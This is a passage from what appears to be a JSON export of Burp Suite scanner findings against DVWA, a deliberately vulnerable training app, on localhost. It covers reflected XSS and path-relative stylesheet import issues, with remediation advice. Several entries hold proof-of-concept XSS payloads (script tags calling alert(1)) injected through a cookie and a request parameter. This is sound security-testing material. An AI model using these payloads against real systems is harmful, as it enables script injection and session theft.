        "issue__issueDetail": "The value of the <b>security</b> cookie is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>m8vro'&gt;&lt;script&gt;alert(1)&lt;/script&gt;p5b7y</b> was submitted in the security cookie. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>Because the user data that is copied into the response is submitted within a cookie, the application's behavior is not trivial to exploit in an attack against another user. Typically, you will need to find a means of setting an arbitrary cookie value in the victim's browser in order to exploit the vulnerability. Applications often contain \"cookie-forcing\" conditions which make this possible, and such a condition in any related domain or subdomain can potentially be used for this purpose. Nonetheless, this limitation somewhat mitigates the impact of the vulnerability.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "51": {
        "\ufeffissue__serialNumber": "3.87994E+17",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [include parameter]",
        "issue__severity": "High",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>include</b> request parameter is copied into the response within the hostname of a URL from which JavaScript will be loaded. The payload <b>http://hdsgmhjdtw</b> was submitted in the include parameter. This input was echoed unmodified within the \"src\" attribute of a \"script\" tag.<br><br>This proof-of-concept attack demonstrates that it is possible to modify the URL to reference an external host and so inject arbitrary JavaScript in the response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "52": {
        "\ufeffissue__serialNumber": "3.09033E+18",
        "issue__type": "2097960",
        "issue__name": "Path-relative style sheet import",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csrf/",
        "issue__location": "/dvwa/vulnerabilities/csrf/",
        "issue__severity": "Information",
        "issue__confidence": "Firm",
        "issue__issueBackground": "<p>Path-relative style sheet import vulnerabilities arise when the following conditions hold:</p>\\n<ol>\\n<li>A response contains a style sheet import that uses a path-relative URL (for example, the page at \"/original-path/file.php\" might import \"styles/main.css\").</li><li>When handling requests, the application or platform tolerates superfluous path-like data following the original filename in the URL (for example, \"/original-path/file.php/extra-junk/\"). When superfluous data is added to the original URL, the application's response still contains a path-relative stylesheet import.</li><li>The response in condition 2 can be made to render in a browser's quirks mode, either because it has a missing or old doctype directive, or because it allows itself to be framed by a page under an attacker's control.</li>\\n<li>When a browser requests the style sheet that is imported in the response from the modified URL (using the URL \"/original-path/file.php/extra-junk/styles/main.css\"), the application returns something other than the CSS response that was supposed to be imported. Given the behavior described in condition 2, this will typically be the same response that was originally returned in condition 1.</li><li>An attacker has a means of manipulating some text within the response in condition 4, for example because the application stores and displays some past input, or echoes some text within the current URL.</li></ol>\\n<p>Given the above conditions, an attacker can execute CSS injection within the browser of the target user. The attacker can construct a URL that causes the victim's browser to import as CSS a different URL than normal, containing text that the attacker can manipulate.</p>\\n<p>Being able to inject arbitrary CSS into the victim's browser may enable various attacks, including:</p>\\n<ul>\\n  <li>Executing arbitrary JavaScript using IE's expression() function.</li><li>Using CSS selectors to read parts of the HTML source, which may include sensitive data such as anti-CSRF tokens.</li>\\n<li>Capturing any sensitive data within the URL query string by making a further style sheet import to a URL on the attacker's domain, and monitoring the incoming Referer header.</li></ul>",
        "issue__remediationBackground": "<p>The root cause of the vulnerability can be resolved by not using path-relative URLs in style sheet imports. Aside from this, attacks can also be prevented by implementing all of the following defensive measures: </p>\\n<ul><li>Setting the HTTP response header \"X-Frame-Options: deny\" in all responses. One method that an attacker can use to make a page render in quirks mode is to frame it within their own page that is rendered in quirks mode. Setting this header prevents the page from being framed.</li><li>Setting a modern doctype (e.g. \"&lt;!doctype html&gt;\") in all HTML responses. This prevents the page from being rendered in quirks mode (unless it is being framed, as described above).</li>\\n<li>Setting the HTTP response header \"X-Content-Type-Options: nosniff\" in all responses. This prevents the browser from processing a non-CSS response as CSS, even if another page loads the response via a style sheet import.</li></ul>",
        "issue__references": "<ul><li><a href=\"https://portswigger.net/research/detecting-and-exploiting-path-relative-stylesheet-import-prssi-vulnerabilities\">Detecting and exploiting path-relative stylesheet import (PRSSI) vulnerabilities</a></li></ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/16.html\">CWE-16: Configuration</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/154.html\">CAPEC-154: Resource Location Spoofing</a></li>\\n  <li><a href=\"https://capec.mitre.org/data/definitions/468.html\">CAPEC-468: Generic Cross-Browser Cross-Domain Theft</a></li>\\n</ul>",
        "issue__issueDetail": "The application may be vulnerable to path-relative style sheet import (PRSSI) attacks. The first four conditions for an exploitable vulnerability are present (see issue background):<ol><li>The original response contains a path-relative style sheet import (see response 1).</li><li>When superfluous path-like data is placed into the URL following the original filename (see request 2), the application's response still contains a path-relative style sheet import (see response 2).</li><li>Response 2 can be made to render in a browser's quirks mode. Although the page contains a modern doctype directive, the response does not prevent itself from being framed. An attacker can frame the response within a page that they control, to force it to be rendered in quirks mode. (Note that this technique is IE-specific and due to P3P restrictions might sometimes limit the impact of a successful attack.)</li><li>When the path-relative style sheet import in response 2 is requested (see request 3) the application returns something other than the CSS response that was supposed to be imported (see response 3).</li></ol>It was not verified whether condition 5 holds (see issue background), and you should manually investigate whether it is possible to manipulate some text within response 3, to enable full exploitation of this issue.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "53": {
        "\ufeffissue__serialNumber": "2.43148E+18",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [include parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/79.html\">CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/80.html\">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/159.html\">CWE-159: Failure to Sanitize Special Element</a></li>\\n    <li><a href=\"https://capec.mitre.org/data/definitions/591.html\">CAPEC-591: Reflected XSS</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>include</b> request parameter is copied into the value of an HTML tag attribute which is encapsulated in single quotation marks. The payload <b>v1yrf'&gt;&lt;script&gt;alert(1)&lt;/script&gt;a4icu</b> was submitted in the include parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "54": {
        "\ufeffissue__serialNumber": "1.54861E+18",
        "issue__type": "4197376",
        "issue__name": "Input returned in response (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/csp/",
        "issue__location": "/dvwa/vulnerabilities/csp/ [include parameter]",
        "issue__severity": "Information",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>",
        "issue__remediationBackground": "",
        "issue__references": "",
        "issue__vulnerabilityClassifications": "<ul>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/20.html\">CWE-20: Improper Input Validation</a></li>\\n<li><a href=\"https://cwe.mitre.org/data/definitions/116.html\">CWE-116: Improper Encoding or Escaping of Output</a></li>\\n</ul>",
        "issue__issueDetail": "The value of the <b>include</b> request parameter is copied into the application's response.",
        "issue__issueDetailItems__issueDetailItem__001": "",
        "issue__issueDetailItems__issueDetailItem__002": "",
        "issue__issueDetailItems__issueDetailItem__003": "",
        "issue__issueDetailItems__issueDetailItem__004": "",
        "issue__issueDetailItems__issueDetailItem__005": "",
        "issue__issueDetailItems__issueDetailItem__006": "",
        "issue__issueDetailItems__issueDetailItem__007": "",
        "issue__issueDetailItems__issueDetailItem__008": "",
        "issue__issueDetailItems__issueDetailItem__009": "",
        "issue__issueDetailItems__issueDetailItem__010": "",
        "issue__issueDetailItems__issueDetailItem__011": "",
        "issue__issueDetailItems__issueDetailItem__012": "",
        "issue__issueDetailItems__issueDetailItem__013": "",
        "issue__issueDetailItems__issueDetailItem__014": "",
        "issue__issueDetailItems__issueDetailItem__015": "",
        "issue__issueDetailItems__issueDetailItem__016": "",
        "issue__issueDetailItems__issueDetailItem__017": "",
        "issue__issueDetailItems__issueDetailItem__018": "",
        "issue__issueDetailItems__issueDetailItem__019": "",
        "issue__issueDetailItems__issueDetailItem": "",
        "issue__staticAnalysis__source": "",
        "issue__staticAnalysis__sink": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__001": "",
        "issue__staticAnalysis__codeSnippets__codeSnippet__002": "",
        "issue__dynamicAnalysis__source": "",
        "issue__dynamicAnalysis__sink": "",
        "issue__dynamicAnalysis__sourceStackTrace": "",
        "issue__dynamicAnalysis__sinkStackTrace": "",
        "issue__dynamicAnalysis__eventListenerStackTrace": "",
        "issue__dynamicAnalysis__sourceValue": "",
        "issue__dynamicAnalysis__sinkValue": "",
        "issue__dynamicAnalysis__eventHandlerData": "",
        "issue__dynamicAnalysis__eventHandlerDataType": "",
        "issue__dynamicAnalysis__eventHandlerManipulatedData": "",
        "issue__dynamicAnalysis__poc": "",
        "issue__dynamicAnalysis__origin": "",
        "issue__dynamicAnalysis__isOriginChecked": "",
        "issue__dynamicAnalysis__sourceElementId": "",
        "issue__dynamicAnalysis__sourceElementName": "",
        "issue__dynamicAnalysis__eventFiredEventName": "",
        "issue__dynamicAnalysis__eventFiredElementId": "",
        "issue__dynamicAnalysis__eventFiredElementName": "",
        "issue__dynamicAnalysis__eventFiredOuterHtml": "",
        "issue__remediationDetail": "",
        "issue__collaboratorEvent__interactionType": "",
        "issue__collaboratorEvent__originIp": "",
        "issue__collaboratorEvent__time": "",
        "issue__collaboratorEvent__lookupType": "",
        "issue__collaboratorEvent__lookupHost": ""
    },
    "55": {
        "\ufeffissue__serialNumber": "8.4524E+17",
        "issue__type": "2097920",
        "issue__name": "Cross-site scripting (reflected)",
        "issue__host__ip": "127.0.0.1",
        "issue__host__#Text": "https://localhost:8888",
        "issue__path": "/dvwa/vulnerabilities/xss_r/",
        "issue__location": "/dvwa/vulnerabilities/xss_r/ [name parameter]",
        "issue__severity": "High",
        "issue__confidence": "Certain",
        "issue__issueBackground": "<p>Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request that, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.</p>\\n<p>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.</p>\\n<p>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site that causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).</p>\\n<p>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality that it contains, and the other applications that belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain that can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization that owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application and exploiting users' trust in the organization in order to capture credentials for other applications that it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk. </p>",
        "issue__remediationBackground": "<p>In most situations where user-controllable data is copied into application responses, cross-site scripting \\n  attacks can be prevented using two layers of defenses:</p>\\n<ul>\\n  <li>Input should be validated as strictly as possible on arrival, given the kind of content that \\nit is expected to contain. For example, personal names should consist of alphabetical \\nand a small range of typographical characters, and be relatively short; a year of birth \\nshould consist of exactly four numerals; email addresses should match a well-defined \\nregular expression. Input which fails the validation should be rejected, not sanitized.</li>\\n<li>User input should be HTML-encoded at any point where it is copied into \\napplication responses. All HTML metacharacters, including &lt; &gt; \" ' and =, should be \\nreplaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>\\n<p>In cases where the application's functionality allows users to author content using \\n  a restricted subset of HTML tags and attributes (for example, blog comments which \\n  allow limited formatting and linking), it is necessary to parse the supplied HTML to \\n  validate that it does not use any dangerous syntax; this is a non-trivial task.</p>",
        "issue__references": "<ul>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting\">Web Security Academy: Cross-site scripting</a></li>\\n\t<li><a href=\"https://portswigger.net/web-security/cross-site-scripting/reflected\">Web Security Academy: Reflected cross-site scripting</a></li>\\n\t<li><a href=\"https://support.portswigger.net/customer/portal/articles/1965737-Methodology_XSS.html\">Using Burp to Find XSS issues</a></li>\\n</ul>",
